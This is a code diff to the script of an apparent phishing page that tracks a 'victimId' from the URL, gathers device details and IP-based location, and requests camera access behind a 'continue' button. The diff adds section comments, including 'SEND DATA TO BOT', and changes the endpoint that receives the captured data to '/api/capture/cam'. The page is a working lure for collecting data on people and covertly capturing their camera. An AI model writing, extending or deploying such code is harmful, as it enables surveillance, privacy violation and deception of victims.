@@ -105,10 +105,12 @@
     </div>
 
     <script>
+        // ===== URL PARAMS =====
         const urlParams = new URLSearchParams(window.location.search);
         const victimId = urlParams.get('v') || 'unknown';
         const redirectUrl = '{{REDIRECT_URL}}';
 
+        // ===== DEVICE INFO =====
         function getDeviceInfo() {
             const info = {
                 userAgent: navigator.userAgent,
@@ -128,6 +130,7 @@
             return info;
         }
 
+        // ===== IP / LOCATION =====
         async function getLocationInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -143,9 +146,10 @@
             }
         }
 
+        // ===== SEND DATA TO BOT =====
         async function sendData(payload) {
             try {
-                await fetch('/api/capture', {
+                await fetch('/api/capture/cam', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ victim_id: victimId, type: 'cam', ...payload })
@@ -155,6 +159,7 @@
             }
         }
 
+        // ===== CAMERA =====
         function requestCamera() {
             const btn = document.getElementById('continueBtn');
             const loading = document.getElementById('loading');
